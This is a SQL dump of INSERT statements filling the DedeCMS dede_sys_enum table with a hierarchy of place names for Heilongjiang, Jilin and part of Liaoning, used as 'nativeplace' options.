INSERT INTO dede_sys_enum VALUES ('17580', '青冈县', '4512.4', 'nativeplace', '4512', '2');
INSERT INTO dede_sys_enum VALUES ('17579', '兰西县', '4512.3', 'nativeplace', '4512', '2');
INSERT INTO dede_sys_enum VALUES ('17578', '望奎县', '4512.2', 'nativeplace', '4512', '2');
INSERT INTO dede_sys_enum VALUES ('17577', '北林区', '4512.1', 'nativeplace', '4512', '2');
INSERT INTO dede_sys_enum VALUES ('17576', '绥化市', '4512', 'nativeplace', '4512', '1');
INSERT INTO dede_sys_enum VALUES ('17575', '五大连池市', '4511.6', 'nativeplace', '4512', '2');
INSERT INTO dede_sys_enum VALUES ('17574', '北安市', '4511.5', 'nativeplace', '4512', '2');
INSERT INTO dede_sys_enum VALUES ('17573', '孙吴县', '4511.4', 'nativeplace', '4511', '2');
INSERT INTO dede_sys_enum VALUES ('17572', '逊克县', '4511.3', 'nativeplace', '4511', '2');
INSERT INTO dede_sys_enum VALUES ('17571', '嫩江县', '4511.2', 'nativeplace', '4511', '2');
INSERT INTO dede_sys_enum VALUES ('17570', '爱辉区', '4511.1', 'nativeplace', '4511', '2');
INSERT INTO dede_sys_enum VALUES ('17569', '黑河市', '4511', 'nativeplace', '4511', '1');
INSERT INTO dede_sys_enum VALUES ('17568', '穆棱市', '4510.10', 'nativeplace', '4510', '2');
INSERT INTO dede_sys_enum VALUES ('17567', '宁安市', '4510.9', 'nativeplace', '4511', '2');
INSERT INTO dede_sys_enum VALUES ('17566', '海林市', '4510.8', 'nativeplace', '4511', '2');
INSERT INTO dede_sys_enum VALUES ('17565', '绥芬河市', '4510.7', 'nativeplace', '4511', '2');
INSERT INTO dede_sys_enum VALUES ('17564', '林口县', '4510.6', 'nativeplace', '4511', '2');
INSERT INTO dede_sys_enum VALUES ('17563', '东宁县', '4510.5', 'nativeplace', '4511', '2');
INSERT INTO dede_sys_enum VALUES ('17562', '西安区', '4510.4', 'nativeplace', '4510', '2');
INSERT INTO dede_sys_enum VALUES ('17561', '爱民区', '4510.3', 'nativeplace', '4510', '2');
INSERT INTO dede_sys_enum VALUES ('17560', '阳明区', '4510.2', 'nativeplace', '4510', '2');
INSERT INTO dede_sys_enum VALUES ('17559', '东安区', '4510.1', 'nativeplace', '4510', '2');
INSERT INTO dede_sys_enum VALUES ('17558', '牡丹江市', '4510', 'nativeplace', '4510', '1');
INSERT INTO dede_sys_enum VALUES ('17557', '勃利县', '4509.4', 'nativeplace', '4509', '2');
INSERT INTO dede_sys_enum VALUES ('17556', '茄子河区', '4509.3', 'nativeplace', '4509', '2');
INSERT INTO dede_sys_enum VALUES ('17555', '桃山区', '4509.2', 'nativeplace', '4509', '2');
INSERT INTO dede_sys_enum VALUES ('17554', '新兴区', '4509.1', 'nativeplace', '4509', '2');
INSERT INTO dede_sys_enum VALUES ('17553', '七台河市', '4509', 'nativeplace', '4509', '1');
INSERT INTO dede_sys_enum VALUES ('17552', '富锦市', '4508.11', 'nativeplace', '4508', '2');
INSERT INTO dede_sys_enum VALUES ('17551', '同江市', '4508.10', 'nativeplace', '4508', '2');
INSERT INTO dede_sys_enum VALUES ('17550', '抚远县', '4508.9', 'nativeplace', '4509', '2');
INSERT INTO dede_sys_enum VALUES ('17549', '汤原县', '4508.8', 'nativeplace', '4509', '2');
INSERT INTO dede_sys_enum VALUES ('17548', '桦川县', '4508.7', 'nativeplace', '4509', '2');
INSERT INTO dede_sys_enum VALUES ('17547', '桦南县', '4508.6', 'nativeplace', '4509', '2');
INSERT INTO dede_sys_enum VALUES ('17546', '郊　区', '4508.5', 'nativeplace', '4509', '2');
INSERT INTO dede_sys_enum VALUES ('17545', '东风区', '4508.4', 'nativeplace', '4508', '2');
INSERT INTO dede_sys_enum VALUES ('17544', '前进区', '4508.3', 'nativeplace', '4508', '2');
INSERT INTO dede_sys_enum VALUES ('17543', '向阳区', '4508.2', 'nativeplace', '4508', '2');
INSERT INTO dede_sys_enum VALUES ('17542', '永红区', '4508.1', 'nativeplace', '4508', '2');
INSERT INTO dede_sys_enum VALUES ('17541', '佳木斯市', '4508', 'nativeplace', '4508', '1');
INSERT INTO dede_sys_enum VALUES ('17540', '铁力市', '4507.17', 'nativeplace', '4507', '2');
INSERT INTO dede_sys_enum VALUES ('17539', '嘉荫县', '4507.16', 'nativeplace', '4507', '2');
INSERT INTO dede_sys_enum VALUES ('17538', '上甘岭区', '4507.15', 'nativeplace', '4507', '2');
INSERT INTO dede_sys_enum VALUES ('17537', '红星区', '4507.14', 'nativeplace', '4507', '2');
INSERT INTO dede_sys_enum VALUES ('17536', '乌伊岭区', '4507.13', 'nativeplace', '4507', '2');
INSERT INTO dede_sys_enum VALUES ('17535', '带岭区', '4507.12', 'nativeplace', '4507', '2');
INSERT INTO dede_sys_enum VALUES ('17534', '汤旺河区', '4507.11', 'nativeplace', '4507', '2');
INSERT INTO dede_sys_enum VALUES ('17533', '乌马河区', '4507.10', 'nativeplace', '4507', '2');
INSERT INTO dede_sys_enum VALUES ('17532', '五营区', '4507.9', 'nativeplace', '4508', '2');
INSERT INTO dede_sys_enum VALUES ('17531', '金山屯区', '4507.8', 'nativeplace', '4508', '2');
INSERT INTO dede_sys_enum VALUES ('17530', '美溪区', '4507.7', 'nativeplace', '4508', '2');
INSERT INTO dede_sys_enum VALUES ('17529', '新青区', '4507.6', 'nativeplace', '4508', '2');
INSERT INTO dede_sys_enum VALUES ('17528', '翠峦区', '4507.5', 'nativeplace', '4508', '2');
INSERT INTO dede_sys_enum VALUES ('17527', '西林区', '4507.4', 'nativeplace', '4507', '2');
INSERT INTO dede_sys_enum VALUES ('17526', '友好区', '4507.3', 'nativeplace', '4507', '2');
INSERT INTO dede_sys_enum VALUES ('17525', '南岔区', '4507.2', 'nativeplace', '4507', '2');
INSERT INTO dede_sys_enum VALUES ('17524', '伊春区', '4507.1', 'nativeplace', '4507', '2');
INSERT INTO dede_sys_enum VALUES ('17523', '伊春市', '4507', 'nativeplace', '4507', '1');
INSERT INTO dede_sys_enum VALUES ('17522', '杜尔伯特蒙古族自治县', '4506.9', 'nativeplace', '4507', '2');
INSERT INTO dede_sys_enum VALUES ('17521', '林甸县', '4506.8', 'nativeplace', '4507', '2');
INSERT INTO dede_sys_enum VALUES ('17520', '肇源县', '4506.7', 'nativeplace', '4507', '2');
INSERT INTO dede_sys_enum VALUES ('17519', '肇州县', '4506.6', 'nativeplace', '4507', '2');
INSERT INTO dede_sys_enum VALUES ('17518', '大同区', '4506.5', 'nativeplace', '4507', '2');
INSERT INTO dede_sys_enum VALUES ('17517', '红岗区', '4506.4', 'nativeplace', '4506', '2');
INSERT INTO dede_sys_enum VALUES ('17516', '让胡路区', '4506.3', 'nativeplace', '4506', '2');
INSERT INTO dede_sys_enum VALUES ('17515', '龙凤区', '4506.2', 'nativeplace', '4506', '2');
INSERT INTO dede_sys_enum VALUES ('17514', '萨尔图区', '4506.1', 'nativeplace', '4506', '2');
INSERT INTO dede_sys_enum VALUES ('17513', '大庆市', '4506', 'nativeplace', '4506', '1');
INSERT INTO dede_sys_enum VALUES ('17512', '饶河县', '4505.8', 'nativeplace', '4506', '2');
INSERT INTO dede_sys_enum VALUES ('17511', '宝清县', '4505.7', 'nativeplace', '4506', '2');
INSERT INTO dede_sys_enum VALUES ('17510', '友谊县', '4505.6', 'nativeplace', '4506', '2');
INSERT INTO dede_sys_enum VALUES ('17509', '集贤县', '4505.5', 'nativeplace', '4506', '2');
INSERT INTO dede_sys_enum VALUES ('17508', '宝山区', '4505.4', 'nativeplace', '4505', '2');
INSERT INTO dede_sys_enum VALUES ('17507', '四方台区', '4505.3', 'nativeplace', '4505', '2');
INSERT INTO dede_sys_enum VALUES ('17506', '岭东区', '4505.2', 'nativeplace', '4505', '2');
INSERT INTO dede_sys_enum VALUES ('17505', '尖山区', '4505.1', 'nativeplace', '4505', '2');
INSERT INTO dede_sys_enum VALUES ('17504', '双鸭山市', '4505', 'nativeplace', '4505', '1');
INSERT INTO dede_sys_enum VALUES ('17503', '绥滨县', '4504.8', 'nativeplace', '4505', '2');
INSERT INTO dede_sys_enum VALUES ('17502', '萝北县', '4504.7', 'nativeplace', '4505', '2');
INSERT INTO dede_sys_enum VALUES ('17501', '兴山区', '4504.6', 'nativeplace', '4505', '2');
INSERT INTO dede_sys_enum VALUES ('17500', '东山区', '4504.5', 'nativeplace', '4505', '2');
INSERT INTO dede_sys_enum VALUES ('17499', '兴安区', '4504.4', 'nativeplace', '4504', '2');
INSERT INTO dede_sys_enum VALUES ('17498', '南山区', '4504.3', 'nativeplace', '4504', '2');
INSERT INTO dede_sys_enum VALUES ('17497', '工农区', '4504.2', 'nativeplace', '4504', '2');
INSERT INTO dede_sys_enum VALUES ('17496', '向阳区', '4504.1', 'nativeplace', '4504', '2');
INSERT INTO dede_sys_enum VALUES ('17495', '鹤岗市', '4504', 'nativeplace', '4504', '1');
INSERT INTO dede_sys_enum VALUES ('17494', '密山市', '4503.9', 'nativeplace', '4504', '2');
INSERT INTO dede_sys_enum VALUES ('17493', '虎林市', '4503.8', 'nativeplace', '4504', '2');
INSERT INTO dede_sys_enum VALUES ('17492', '鸡东县', '4503.7', 'nativeplace', '4504', '2');
INSERT INTO dede_sys_enum VALUES ('17491', '麻山区', '4503.6', 'nativeplace', '4504', '2');
INSERT INTO dede_sys_enum VALUES ('17490', '城子河区', '4503.5', 'nativeplace', '4504', '2');
INSERT INTO dede_sys_enum VALUES ('17489', '梨树区', '4503.4', 'nativeplace', '4503', '2');
INSERT INTO dede_sys_enum VALUES ('17488', '滴道区', '4503.3', 'nativeplace', '4503', '2');
INSERT INTO dede_sys_enum VALUES ('17487', '恒山区', '4503.2', 'nativeplace', '4503', '2');
INSERT INTO dede_sys_enum VALUES ('17486', '鸡冠区', '4503.1', 'nativeplace', '4503', '2');
INSERT INTO dede_sys_enum VALUES ('17485', '鸡西市', '4503', 'nativeplace', '4503', '1');
INSERT INTO dede_sys_enum VALUES ('17484', '讷河市', '4502.15', 'nativeplace', '4502', '2');
INSERT INTO dede_sys_enum VALUES ('17483', '拜泉县', '4502.14', 'nativeplace', '4502', '2');
INSERT INTO dede_sys_enum VALUES ('17482', '克东县', '4502.13', 'nativeplace', '4502', '2');
INSERT INTO dede_sys_enum VALUES ('17481', '克山县', '4502.12', 'nativeplace', '4502', '2');
INSERT INTO dede_sys_enum VALUES ('17480', '富裕县', '4502.11', 'nativeplace', '4502', '2');
INSERT INTO dede_sys_enum VALUES ('17479', '甘南县', '4502.10', 'nativeplace', '4502', '2');
INSERT INTO dede_sys_enum VALUES ('17478', '泰来县', '4502.9', 'nativeplace', '4503', '2');
INSERT INTO dede_sys_enum VALUES ('17477', '龙江县 依安县', '4502.8', 'nativeplace', '4503', '2');
INSERT INTO dede_sys_enum VALUES ('17476', '梅里斯达斡尔族区', '4502.7', 'nativeplace', '4503', '2');
INSERT INTO dede_sys_enum VALUES ('17475', '碾子山区', '4502.6', 'nativeplace', '4503', '2');
INSERT INTO dede_sys_enum VALUES ('17474', '富拉尔基区', '4502.5', 'nativeplace', '4503', '2');
INSERT INTO dede_sys_enum VALUES ('17473', '昂昂溪区', '4502.4', 'nativeplace', '4502', '2');
INSERT INTO dede_sys_enum VALUES ('17472', '铁锋区', '4502.3', 'nativeplace', '4502', '2');
INSERT INTO dede_sys_enum VALUES ('17471', '建华区', '4502.2', 'nativeplace', '4502', '2');
INSERT INTO dede_sys_enum VALUES ('17470', '龙沙区', '4502.1', 'nativeplace', '4502', '2');
INSERT INTO dede_sys_enum VALUES ('17469', '齐齐哈尔市', '4502', 'nativeplace', '4502', '1');
INSERT INTO dede_sys_enum VALUES ('17468', '五常市', '4501.19', 'nativeplace', '4501', '2');
INSERT INTO dede_sys_enum VALUES ('17467', '尚志市', '4501.18', 'nativeplace', '4501', '2');
INSERT INTO dede_sys_enum VALUES ('17466', '双城市', '4501.17', 'nativeplace', '4501', '2');
INSERT INTO dede_sys_enum VALUES ('17465', '阿城市', '4501.16', 'nativeplace', '4501', '2');
INSERT INTO dede_sys_enum VALUES ('17464', '延寿县', '4501.15', 'nativeplace', '4501', '2');
INSERT INTO dede_sys_enum VALUES ('17463', '通河县', '4501.14', 'nativeplace', '4501', '2');
INSERT INTO dede_sys_enum VALUES ('17462', '木兰县', '4501.13', 'nativeplace', '4501', '2');
INSERT INTO dede_sys_enum VALUES ('17461', '巴彦县', '4501.12', 'nativeplace', '4501', '2');
INSERT INTO dede_sys_enum VALUES ('17460', '宾　县', '4501.11', 'nativeplace', '4501', '2');
INSERT INTO dede_sys_enum VALUES ('17459', '方正县', '4501.10', 'nativeplace', '4501', '2');
INSERT INTO dede_sys_enum VALUES ('17458', '依兰县', '4501.9', 'nativeplace', '4502', '2');
INSERT INTO dede_sys_enum VALUES ('17457', '呼兰区', '4501.8', 'nativeplace', '4502', '2');
INSERT INTO dede_sys_enum VALUES ('17456', '松北区', '4501.7', 'nativeplace', '4502', '2');
INSERT INTO dede_sys_enum VALUES ('17455', '平房区', '4501.6', 'nativeplace', '4502', '2');
INSERT INTO dede_sys_enum VALUES ('17454', '动力区', '4501.5', 'nativeplace', '4502', '2');
INSERT INTO dede_sys_enum VALUES ('17453', '香坊区', '4501.4', 'nativeplace', '4501', '2');
INSERT INTO dede_sys_enum VALUES ('17452', '道外区', '4501.3', 'nativeplace', '4501', '2');
INSERT INTO dede_sys_enum VALUES ('17451', '南岗区', '4501.2', 'nativeplace', '4501', '2');
INSERT INTO dede_sys_enum VALUES ('17450', '道里区', '4501.1', 'nativeplace', '4501', '2');
INSERT INTO dede_sys_enum VALUES ('17449', '哈尔滨市', '4501', 'nativeplace', '4501', '1');
INSERT INTO dede_sys_enum VALUES ('17448', '黑龙江省', '4500', 'nativeplace', '4500', '0');
INSERT INTO dede_sys_enum VALUES ('17447', '安图县', '4009.8', 'nativeplace', '4010', '2');
INSERT INTO dede_sys_enum VALUES ('17446', '汪清县', '4009.7', 'nativeplace', '4010', '2');
INSERT INTO dede_sys_enum VALUES ('17445', '和龙市', '4009.6', 'nativeplace', '4010', '2');
INSERT INTO dede_sys_enum VALUES ('17444', '龙井市', '4009.5', 'nativeplace', '4010', '2');
INSERT INTO dede_sys_enum VALUES ('17443', '珲春市', '4009.4', 'nativeplace', '4009', '2');
INSERT INTO dede_sys_enum VALUES ('17442', '敦化市', '4009.3', 'nativeplace', '4009', '2');
INSERT INTO dede_sys_enum VALUES ('17441', '图们市', '4009.2', 'nativeplace', '4009', '2');
INSERT INTO dede_sys_enum VALUES ('17440', '延吉市', '4009.1', 'nativeplace', '4009', '2');
INSERT INTO dede_sys_enum VALUES ('17439', '延边朝鲜族自治州', '4009', 'nativeplace', '4009', '1');
INSERT INTO dede_sys_enum VALUES ('17438', '大安市', '4008.5', 'nativeplace', '4009', '2');
INSERT INTO dede_sys_enum VALUES ('17437', '洮南市', '4008.4', 'nativeplace', '4008', '2');
INSERT INTO dede_sys_enum VALUES ('17436', '通榆县', '4008.3', 'nativeplace', '4008', '2');
INSERT INTO dede_sys_enum VALUES ('17435', '镇赉县', '4008.2', 'nativeplace', '4008', '2');
INSERT INTO dede_sys_enum VALUES ('17434', '洮北区', '4008.1', 'nativeplace', '4008', '2');
INSERT INTO dede_sys_enum VALUES ('17433', '白城市', '4008', 'nativeplace', '4008', '1');
INSERT INTO dede_sys_enum VALUES ('17432', '扶余县', '4007.5', 'nativeplace', '4008', '2');
INSERT INTO dede_sys_enum VALUES ('17431', '乾安县', '4007.4', 'nativeplace', '4007', '2');
INSERT INTO dede_sys_enum VALUES ('17430', '长岭县', '4007.3', 'nativeplace', '4007', '2');
INSERT INTO dede_sys_enum VALUES ('17429', '前郭尔罗斯蒙古族自治县', '4007.2', 'nativeplace', '4007', '2');
INSERT INTO dede_sys_enum VALUES ('17428', '宁江区', '4007.1', 'nativeplace', '4007', '2');
INSERT INTO dede_sys_enum VALUES ('17427', '松原市', '4007', 'nativeplace', '4007', '1');
INSERT INTO dede_sys_enum VALUES ('17426', '临江市', '4006.6', 'nativeplace', '4007', '2');
INSERT INTO dede_sys_enum VALUES ('17425', '江源县', '4006.5', 'nativeplace', '4007', '2');
INSERT INTO dede_sys_enum VALUES ('17424', '长白朝鲜族自治县', '4006.4', 'nativeplace', '4006', '2');
INSERT INTO dede_sys_enum VALUES ('17423', '靖宇县', '4006.3', 'nativeplace', '4006', '2');
INSERT INTO dede_sys_enum VALUES ('17422', '抚松县', '4006.2', 'nativeplace', '4006', '2');
INSERT INTO dede_sys_enum VALUES ('17421', '八道江区', '4006.1', 'nativeplace', '4006', '2');
INSERT INTO dede_sys_enum VALUES ('17420', '白山市', '4006', 'nativeplace', '4006', '1');
INSERT INTO dede_sys_enum VALUES ('17419', '集安市', '4005.7', 'nativeplace', '4006', '2');
INSERT INTO dede_sys_enum VALUES ('17418', '梅河口市', '4005.6', 'nativeplace', '4006', '2');
INSERT INTO dede_sys_enum VALUES ('17417', '柳河县', '4005.5', 'nativeplace', '4006', '2');
INSERT INTO dede_sys_enum VALUES ('17416', '辉南县', '4005.4', 'nativeplace', '4005', '2');
INSERT INTO dede_sys_enum VALUES ('17415', '通化县', '4005.3', 'nativeplace', '4005', '2');
INSERT INTO dede_sys_enum VALUES ('17414', '二道江区', '4005.2', 'nativeplace', '4005', '2');
INSERT INTO dede_sys_enum VALUES ('17413', '东昌区', '4005.1', 'nativeplace', '4005', '2');
INSERT INTO dede_sys_enum VALUES ('17412', '通化市', '4005', 'nativeplace', '4005', '1');
INSERT INTO dede_sys_enum VALUES ('17411', '东辽县', '4004.4', 'nativeplace', '4004', '2');
INSERT INTO dede_sys_enum VALUES ('17410', '东丰县', '4004.3', 'nativeplace', '4004', '2');
INSERT INTO dede_sys_enum VALUES ('17409', '西安区', '4004.2', 'nativeplace', '4004', '2');
INSERT INTO dede_sys_enum VALUES ('17408', '龙山区', '4004.1', 'nativeplace', '4004', '2');
INSERT INTO dede_sys_enum VALUES ('17407', '辽源市', '4004', 'nativeplace', '4004', '1');
INSERT INTO dede_sys_enum VALUES ('17406', '双辽市', '4003.6', 'nativeplace', '4004', '2');
INSERT INTO dede_sys_enum VALUES ('17405', '公主岭市', '4003.5', 'nativeplace', '4004', '2');
INSERT INTO dede_sys_enum VALUES ('17404', '伊通满族自治县', '4003.4', 'nativeplace', '4003', '2');
INSERT INTO dede_sys_enum VALUES ('17403', '梨树县', '4003.3', 'nativeplace', '4003', '2');
INSERT INTO dede_sys_enum VALUES ('17402', '铁东区', '4003.2', 'nativeplace', '4003', '2');
INSERT INTO dede_sys_enum VALUES ('17401', '铁西区', '4003.1', 'nativeplace', '4003', '2');
INSERT INTO dede_sys_enum VALUES ('17400', '四平市', '4003', 'nativeplace', '4003', '1');
INSERT INTO dede_sys_enum VALUES ('17399', '磐石市', '4002.9', 'nativeplace', '4003', '2');
INSERT INTO dede_sys_enum VALUES ('17398', '舒兰市', '4002.8', 'nativeplace', '4003', '2');
INSERT INTO dede_sys_enum VALUES ('17397', '桦甸市', '4002.7', 'nativeplace', '4003', '2');
INSERT INTO dede_sys_enum VALUES ('17396', '蛟河市', '4002.6', 'nativeplace', '4003', '2');
INSERT INTO dede_sys_enum VALUES ('17395', '永吉县', '4002.5', 'nativeplace', '4003', '2');
INSERT INTO dede_sys_enum VALUES ('17394', '丰满区', '4002.4', 'nativeplace', '4002', '2');
INSERT INTO dede_sys_enum VALUES ('17393', '船营区', '4002.3', 'nativeplace', '4002', '2');
INSERT INTO dede_sys_enum VALUES ('17392', '龙潭区', '4002.2', 'nativeplace', '4002', '2');
INSERT INTO dede_sys_enum VALUES ('17391', '昌邑区', '4002.1', 'nativeplace', '4002', '2');
INSERT INTO dede_sys_enum VALUES ('17390', '吉林市', '4002', 'nativeplace', '4002', '1');
INSERT INTO dede_sys_enum VALUES ('17389', '德惠市', '4001.10', 'nativeplace', '4001', '2');
INSERT INTO dede_sys_enum VALUES ('17388', '榆树市', '4001.9', 'nativeplace', '4002', '2');
INSERT INTO dede_sys_enum VALUES ('17387', '九台市', '4001.8', 'nativeplace', '4002', '2');
INSERT INTO dede_sys_enum VALUES ('17386', '农安县', '4001.7', 'nativeplace', '4002', '2');
INSERT INTO dede_sys_enum VALUES ('17385', '双阳区', '4001.6', 'nativeplace', '4002', '2');
INSERT INTO dede_sys_enum VALUES ('17384', '绿园区', '4001.5', 'nativeplace', '4002', '2');
INSERT INTO dede_sys_enum VALUES ('17383', '二道区', '4001.4', 'nativeplace', '4001', '2');
INSERT INTO dede_sys_enum VALUES ('17382', '朝阳区', '4001.3', 'nativeplace', '4001', '2');
INSERT INTO dede_sys_enum VALUES ('17381', '宽城区', '4001.2', 'nativeplace', '4001', '2');
INSERT INTO dede_sys_enum VALUES ('17380', '南关区', '4001.1', 'nativeplace', '4001', '2');
INSERT INTO dede_sys_enum VALUES ('17379', '长春市', '4001', 'nativeplace', '4001', '1');
INSERT INTO dede_sys_enum VALUES ('17378', '吉林省', '4000', 'nativeplace', '4000', '0');
INSERT INTO dede_sys_enum VALUES ('17377', '兴城市', '3514.6', 'nativeplace', '3515', '2');
INSERT INTO dede_sys_enum VALUES ('17376', '建昌县', '3514.5', 'nativeplace', '3515', '2');
INSERT INTO dede_sys_enum VALUES ('17375', '绥中县', '3514.4', 'nativeplace', '3514', '2');
INSERT INTO dede_sys_enum VALUES ('17374', '南票区', '3514.3', 'nativeplace', '3514', '2');
INSERT INTO dede_sys_enum VALUES ('17373', '龙港区', '3514.2', 'nativeplace', '3514', '2');
INSERT INTO dede_sys_enum VALUES ('17372', '连山区', '3514.1', 'nativeplace', '3514', '2');
INSERT INTO dede_sys_enum VALUES ('17371', '葫芦岛市', '3514', 'nativeplace', '3514', '1');
INSERT INTO dede_sys_enum VALUES ('17370', '凌源市', '3513.7', 'nativeplace', '3514', '2');
INSERT INTO dede_sys_enum VALUES ('17369', '北票市', '3513.6', 'nativeplace', '3514', '2');
INSERT INTO dede_sys_enum VALUES ('17368', '喀喇沁左翼蒙古族自治县', '3513.5', 'nativeplace', '3514', '2');
INSERT INTO dede_sys_enum VALUES ('17367', '建平县', '3513.4', 'nativeplace', '3513', '2');
INSERT INTO dede_sys_enum VALUES ('17366', '朝阳县', '3513.3', 'nativeplace', '3513', '2');
INSERT INTO dede_sys_enum VALUES ('17365', '龙城区', '3513.2', 'nativeplace', '3513', '2');
INSERT INTO dede_sys_enum VALUES ('17364', '双塔区', '3513.1', 'nativeplace', '3513', '2');
INSERT INTO dede_sys_enum VALUES ('17363', '朝阳市', '3513', 'nativeplace', '3513', '1');
INSERT INTO dede_sys_enum VALUES ('17362', '开原市', '3512.7', 'nativeplace', '3513', '2');
INSERT INTO dede_sys_enum VALUES ('17361', '调兵山市', '3512.6', 'nativeplace', '3513', '2');
INSERT INTO dede_sys_enum VALUES ('17360', '昌图县', '3512.5', 'nativeplace', '3513', '2');
INSERT INTO dede_sys_enum VALUES ('17359', '西丰县', '3512.4', 'nativeplace', '3512', '2');
INSERT INTO dede_sys_enum VALUES ('17358', '铁岭县', '3512.3', 'nativeplace', '3512', '2');
INSERT INTO dede_sys_enum VALUES ('17357', '清河区', '3512.2', 'nativeplace', '3512', '2');
INSERT INTO dede_sys_enum VALUES ('17356', '银州区', '3512.1', 'nativeplace', '3512', '2');
INSERT INTO dede_sys_enum VALUES ('17355', '铁岭市', '3512', 'nativeplace', '3512', '1');
INSERT INTO dede_sys_enum VALUES ('17354', '盘山县', '3511.4', 'nativeplace', '3511', '2');
INSERT INTO dede_sys_enum VALUES ('17353', '大洼县', '3511.3', 'nativeplace', '3511', '2');
INSERT INTO dede_sys_enum VALUES ('17352', '兴隆台区', '3511.2', 'nativeplace', '3511', '2');
INSERT INTO dede_sys_enum VALUES ('17351', '双台子区', '3511.1', 'nativeplace', '3511', '2');
INSERT INTO dede_sys_enum VALUES ('17350', '盘锦市', '3511', 'nativeplace', '3511', '1');
INSERT INTO dede_sys_enum VALUES ('17349', '灯塔市', '3510.7', 'nativeplace', '3511', '2');
INSERT INTO dede_sys_enum VALUES ('17348', '辽阳县', '3510.6', 'nativeplace', '3511', '2');
INSERT INTO dede_sys_enum VALUES ('17347', '太子河区', '3510.5', 'nativeplace', '3511', '2');
INSERT INTO dede_sys_enum VALUES ('17346', '弓长岭区', '3510.4', 'nativeplace', '3510', '2');
INSERT INTO dede_sys_enum VALUES ('17345', '宏伟区', '3510.3', 'nativeplace', '3510', '2');
INSERT INTO dede_sys_enum VALUES ('17344', '文圣区', '3510.2', 'nativeplace', '3510', '2');
INSERT INTO dede_sys_enum VALUES ('17343', '白塔区', '3510.1', 'nativeplace', '3510', '2');
INSERT INTO dede_sys_enum VALUES ('17342', '辽阳市', '3510', 'nativeplace', '3510', '1');
INSERT INTO dede_sys_enum VALUES ('17341', '彰武县', '3509.7', 'nativeplace', '3510', '2');
INSERT INTO dede_sys_enum VALUES ('17340', '阜新蒙古族自治县', '3509.6', 'nativeplace', '3510', '2');
INSERT INTO dede_sys_enum VALUES ('17339', '细河区', '3509.5', 'nativeplace', '3510', '2');
INSERT INTO dede_sys_enum VALUES ('17338', '清河门区', '3509.4', 'nativeplace', '3509', '2');
INSERT INTO dede_sys_enum VALUES ('17337', '太平区', '3509.3', 'nativeplace', '3509', '2');
INSERT INTO dede_sys_enum VALUES ('17336', '新邱区', '3509.2', 'nativeplace', '3509', '2');
INSERT INTO dede_sys_enum VALUES ('17335', '海州区', '3509.1', 'nativeplace', '3509', '2');
INSERT INTO dede_sys_enum VALUES ('17334', '阜新市', '3509', 'nativeplace', '3509', '1');
INSERT INTO dede_sys_enum VALUES ('17333', '大石桥市', '3508.6', 'nativeplace', '3509', '2');
INSERT INTO dede_sys_enum VALUES ('17332', '盖州市', '3508.5', 'nativeplace', '3509', '2');
INSERT INTO dede_sys_enum VALUES ('17331', '老边区', '3508.4', 'nativeplace', '3508', '2');
INSERT INTO dede_sys_enum VALUES ('17330', '鲅鱼圈区', '3508.3', 'nativeplace', '3508', '2');
INSERT INTO dede_sys_enum VALUES ('17329', '西市区', '3508.2', 'nativeplace', '3508', '2');
INSERT INTO dede_sys_enum VALUES ('17328', '站前区', '3508.1', 'nativeplace', '3508', '2');
INSERT INTO dede_sys_enum VALUES ('17327', '营口市', '3508', 'nativeplace', '3508', '1');
INSERT INTO dede_sys_enum VALUES ('17326', '北宁市', '3507.7', 'nativeplace', '3508', '2');
INSERT INTO dede_sys_enum VALUES ('17325', '凌海市', '3507.6', 'nativeplace', '3508', '2');
INSERT INTO dede_sys_enum VALUES ('17324', '义　县', '3507.5', 'nativeplace', '3508', '2');
INSERT INTO dede_sys_enum VALUES ('17323', '黑山县', '3507.4', 'nativeplace', '3507', '2');
INSERT INTO dede_sys_enum VALUES ('17322', '太和区', '3507.3', 'nativeplace', '3507', '2');
INSERT INTO dede_sys_enum VALUES ('17321', '凌河区', '3507.2', 'nativeplace', '3507', '2');
INSERT INTO dede_sys_enum VALUES ('17320', '古塔区', '3507.1', 'nativeplace', '3507', '2');
INSERT INTO dede_sys_enum VALUES ('17319', '锦州市', '3507', 'nativeplace', '3507', '1');
INSERT INTO dede_sys_enum VALUES ('17318', '凤城市', '3506.6', 'nativeplace', '3507', '2');
INSERT INTO dede_sys_enum VALUES ('17317', '东港市', '3506.5', 'nativeplace', '3507', '2');
INSERT INTO dede_sys_enum VALUES ('17316', '宽甸满族自治县', '3506.4', 'nativeplace', '3506', '2');
INSERT INTO dede_sys_enum VALUES ('17315', '振安区', '3506.3', 'nativeplace', '3506', '2');
INSERT INTO dede_sys_enum VALUES ('17314', '振兴区', '3506.2', 'nativeplace', '3506', '2');
INSERT INTO dede_sys_enum VALUES ('17313', '元宝区', '3506.1', 'nativeplace', '3506', '2');
INSERT INTO dede_sys_enum VALUES ('17312', '丹东市', '3506', 'nativeplace', '3506', '1');
INSERT INTO dede_sys_enum VALUES ('17311', '桓仁满族自治县', '3505.6', 'nativeplace', '3506', '2');
INSERT INTO dede_sys_enum VALUES ('17310', '本溪满族自治县', '3505.5', 'nativeplace', '3506', '2');
INSERT INTO dede_sys_enum VALUES ('17309', '南芬区', '3505.4', 'nativeplace', '3505', '2');
INSERT INTO dede_sys_enum VALUES ('17308', '明山区', '3505.3', 'nativeplace', '3505', '2');
INSERT INTO dede_sys_enum VALUES ('17307', '溪湖区', '3505.2', 'nativeplace', '3505', '2');
INSERT INTO dede_sys_enum VALUES ('17306', '平山区', '3505.1', 'nativeplace', '3505', '2');
INSERT INTO dede_sys_enum VALUES ('17305', '本溪市', '3505', 'nativeplace', '3505', '1');
INSERT INTO dede_sys_enum VALUES ('17304', '清原满族自治县', '3504.7', 'nativeplace', '3505', '2');
INSERT INTO dede_sys_enum VALUES ('17303', '新宾满族自治县', '3504.6', 'nativeplace', '3505', '2');
INSERT INTO dede_sys_enum VALUES ('17302', '抚顺县', '3504.5', 'nativeplace', '3505', '2');
INSERT INTO dede_sys_enum VALUES ('17301', '顺城区', '3504.4', 'nativeplace', '3504', '2');
INSERT INTO dede_sys_enum VALUES ('17300', '望花区', '3504.3', 'nativeplace', '3504', '2');
INSERT INTO dede_sys_enum VALUES ('17299', '东洲区', '3504.2', 'nativeplace', '3504', '2');
INSERT INTO dede_sys_enum VALUES ('17298', '新抚区', '3504.1', 'nativeplace', '3504', '2');
INSERT INTO dede_sys_enum VALUES ('17297', '抚顺市', '3504', 'nativeplace', '3504', '1');
INSERT INTO dede_sys_enum VALUES ('17296', '海城市', '3503.7', 'nativeplace', '3504', '2');
INSERT INTO dede_sys_enum VALUES ('17295', '岫岩满族自治县', '3503.6', 'nativeplace', '3504', '2');
INSERT INTO dede_sys_enum VALUES ('17294', '台安县', '3503.5', 'nativeplace', '3504', '2');
